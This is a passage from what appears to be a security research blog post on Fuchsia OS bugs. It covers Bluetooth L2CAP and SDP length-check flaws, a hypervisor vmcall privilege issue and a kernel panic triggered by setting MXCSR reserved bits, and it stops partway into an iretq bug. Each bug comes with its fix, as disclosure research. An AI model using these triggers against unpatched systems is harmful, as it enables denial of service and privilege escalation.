    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ResponseHandlerAction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kCompleteOutboundTransaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InvokeResponseCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp_cb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;tt class=&quot;docutils literal&quot;&gt;ParseReject()&lt;/tt&gt; method gets called with &lt;tt class=&quot;docutils literal&quot;&gt;rsp_payload&lt;/tt&gt;, which contains the received packet, of an arbitrary size. The method is implemented as follows:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ParseReject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rej_payload_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rej_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rej_payload_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;As&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandRejectPayload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;reject_reason_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RejectReason&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letoh16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rej_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reason&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here the payload is suddenly treated as a &lt;tt class=&quot;docutils literal&quot;&gt;CommandRejectPayload&lt;/tt&gt; structure, with no apparent length check. This could be an out-of-bounds access, but in fact the &lt;tt class=&quot;docutils literal&quot;&gt;.As&amp;lt;&amp;gt;&lt;/tt&gt; directive automatically performs the length check:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;13&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;c1&quot;&gt;// Converts the underlying buffer to the given type with bounds checking. The buffer is allowed&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// to be larger than T. The user is responsible for checking that the first sizeof(T) bytes&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// represents a valid instance of T.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typename&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;As&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// std::is_trivial_v would be a stronger guarantee that the buffer contains a valid T object,&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// but would disallow casting to types that have useful constructors, which might instead cause&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// uninitialized field(s) bugs for data encoding/decoding structs.&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;static_assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_trivially_copyable_v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Can not reinterpret bytes&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ZX_ASSERT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The out-of-bounds access will cause the assert to fire, which will kill the Bluetooth component.&lt;/p&gt;
&lt;p&gt;Therefore, this is only a DoS (&lt;em&gt;Denial Of Service&lt;/em&gt;) of the Bluetooth component and not an interesting bug from an exploitation point of view, (un)fortunately.&lt;/p&gt;
&lt;p&gt;Fix: &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.googlesource.com/fuchsia/+/342a6fe56dc30e8a9a992b13ca31c3bfe954e93a&quot;&gt;[bt][l2cap] Check size of command reject payload&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;sdp-servicesearchresponse&quot; readability=&quot;36.31625967838&quot;&gt;
&lt;h4&gt;SDP: ServiceSearchResponse&lt;/h4&gt;
&lt;p&gt;When parsing ServiceSearchResponse packets, the &lt;a class=&quot;reference external&quot; href=&quot;https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols#Service_discovery_protocol_(SDP)&quot;&gt;SDP&lt;/a&gt; protocol invokes the &lt;tt class=&quot;docutils literal&quot;&gt;&lt;span class=&quot;pre&quot;&gt;ServiceSearchResponse::Parse()&lt;/span&gt;&lt;/tt&gt; function which has the following code:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;n&quot;&gt;Status&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ServiceSearchResponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bt_log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SPEW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sdp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Packet too small to parse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HostError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kPacketMalformed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;betoh16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;As&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServiceHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;bt_log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SPEW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sdp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Packet too small for %d records&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HostError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kPacketMalformed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;record_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServiceHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;service_record_handle_list_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;emplace_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;betoh32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;As&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()));&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The bug is rather clear here: &lt;tt class=&quot;docutils literal&quot;&gt;buf.size() - read_size&lt;/tt&gt; can be equal to zero, and in that case, the whole unsigned expression &lt;tt class=&quot;docutils literal&quot;&gt;(buf.size() - read_size - sizeof(uint8_t))&lt;/tt&gt; wraps and becomes positive, meaning that the length check succeeds.&lt;/p&gt;
&lt;p&gt;The code then iterates and performs out-of-bounds accesses... Except that once again, some constructions are used:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BufferView&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ZX_ASSERT_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;invalid offset (pos = %zu)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BufferView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;min&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;tt class=&quot;docutils literal&quot;&gt;view()&lt;/tt&gt; method catches out-of-bounds accesses. So again, this is only a DoS of the Bluetooth component, not interesting! :'(&lt;/p&gt;
&lt;p&gt;Fix: &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.googlesource.com/fuchsia/+/3c2f2ca62114b840520a92f6bf25332725e09d73&quot;&gt;[bt][sdp] Fix buffer size check, max response size&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;hypervisor-vmcall-bug&quot; readability=&quot;33.586429725363&quot;&gt;
&lt;h3&gt;Hypervisor &lt;tt class=&quot;docutils literal&quot;&gt;vmcall&lt;/tt&gt; bug&lt;/h3&gt;
&lt;p&gt;Fuchsia comes with an embedded hypervisor for both AArch64 and x86_64. It is not completely clear why this hypervisor is present; possibly, to facilitate the transition to Fuchsia, by having a guest Android or Chrome OS system run in a VM and execute Android or Chrome OS applications.&lt;/p&gt;
&lt;p&gt;On x86, we noticed a bug in the handling of the &lt;tt class=&quot;docutils literal&quot;&gt;vmcall&lt;/tt&gt; instruction VMEXITs.&lt;/p&gt;
&lt;p&gt;The hypervisor implements a &lt;em&gt;pvclock&lt;/em&gt; service on &lt;tt class=&quot;docutils literal&quot;&gt;vmcall&lt;/tt&gt;. With this service, the guest kernel can ask the time to the hypervisor, by executing the &lt;tt class=&quot;docutils literal&quot;&gt;vmcall&lt;/tt&gt; instruction with a &lt;em&gt;guest physical address&lt;/em&gt; (GPA) as argument. The hypervisor writes the time structure into the given GPA in memory.&lt;/p&gt;
&lt;p&gt;However, the &lt;tt class=&quot;docutils literal&quot;&gt;vmcall&lt;/tt&gt; instruction is actually legal in the guest userland, and the hypervisor does not verify that the &lt;tt class=&quot;docutils literal&quot;&gt;vmcall&lt;/tt&gt; came from the guest kernel. Therefore, the guest userland can just execute &lt;tt class=&quot;docutils literal&quot;&gt;vmcall&lt;/tt&gt; with whatever GPA and have the guest kernel memory be overwritten.&lt;/p&gt;
&lt;p&gt;This can be used in privilege escalations from the guest userland to the guest kernel. Once in the guest kernel, the attacker has more hypervisor interfaces available, and from there a VM escape vulnerability can be researched and leveraged.&lt;/p&gt;
&lt;p&gt;Fix: &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.googlesource.com/fuchsia/+/11ac53d31b0914f48a5ec3d03a651e53d9c07f02&quot;&gt;[hypervisor][x86] Check CPL when handling a VMCALL&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;kernel-mishandling-of-mxcsr&quot; readability=&quot;27.971646673937&quot;&gt;
&lt;h3&gt;Kernel mishandling of &lt;tt class=&quot;docutils literal&quot;&gt;MXCSR&lt;/tt&gt;&lt;/h3&gt;
&lt;p&gt;The &lt;tt class=&quot;docutils literal&quot;&gt;zx_thread_write_state()&lt;/tt&gt; syscall allows to set the registers of a suspended thread. This syscall is accessible with just a handle on the thread, and thread creation is allowed by default to any userland program, so we can invoke this syscall.&lt;/p&gt;
&lt;p&gt;Among others, this syscall allows to modify the registers encoding the FPU state, and in particular the &lt;tt class=&quot;docutils literal&quot;&gt;MXCSR&lt;/tt&gt; register on x86. This is basically a 32-bit register that has reserved bits that should remain set to zero. The problem is, Zircon doesn't disallow modifications to these reserved bits.&lt;/p&gt;
&lt;p&gt;By using &lt;tt class=&quot;docutils literal&quot;&gt;zx_thread_write_state()&lt;/tt&gt; we can set &lt;tt class=&quot;docutils literal&quot;&gt;MXCSR&lt;/tt&gt; to &lt;tt class=&quot;docutils literal&quot;&gt;0xFFFFFFFF&lt;/tt&gt;, and when the suspended thread resumes a fatal &lt;tt class=&quot;docutils literal&quot;&gt;#GP&lt;/tt&gt; exception is raised, resulting in a kernel panic:&lt;/p&gt;
&lt;img alt=&quot;&quot; class=&quot;align-center&quot; src=&quot;https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/panic.png&quot;/&gt;&lt;p&gt;Of course, this is only an unexploitable panic, but we're making progress: at least we managed to hit the kernel.&lt;/p&gt;
&lt;p&gt;Fix: &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.googlesource.com/fuchsia/+/7eb8c8fb29fd8b6620c66f502bbed182f1b6c5c4&quot;&gt;[zircon][debugger] Don't write reserved part of mxcsr register&lt;/a&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;kernel-mishandling-of-iretq&quot; readability=&quot;38.60775862069&quot;&gt;
&lt;h3&gt;Kernel mishandling of &lt;tt class=&quot;docutils literal&quot;&gt;iretq&lt;/tt&gt;&lt;/h3&gt;
&lt;p&gt;On x86, in order to return from an interrupt or an exception, the &lt;tt class=&quot;docutils literal&quot;&gt;iretq&lt;/tt&gt; instruction is used. This instruction will fault (&lt;tt class=&quot;docutils literal&quot;&gt;#GP&lt;/tt&gt;) if attempting to return to a &lt;em&gt;non-canonical address&lt;/em&gt;, that is to say, if the return address is in the range &lt;tt class=&quot;docutils literal&quot;&gt;0x0000800000000000&lt;/tt&gt;-&lt;tt class=&quot;docutils literal&quot;&gt;0xFFFF7FFFFFFFFFFF&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;This fault is special: it is received with the userland &lt;em&gt;thread-local storage&lt;/em&gt; (TLS) already loaded in the &lt;tt class=&quot;docutils literal&quot;&gt;gs.base&lt;/tt&gt; register, but with the CPL (&lt;em&gt;Current Privilege Level&lt;/em&gt;) of the kernel. The &lt;tt class=&quot;docutils literal&quot;&gt;gs.base&lt;/tt&gt; register is basically a 64-bit register that holds a pointer to the TLS.&lt;/p&gt;
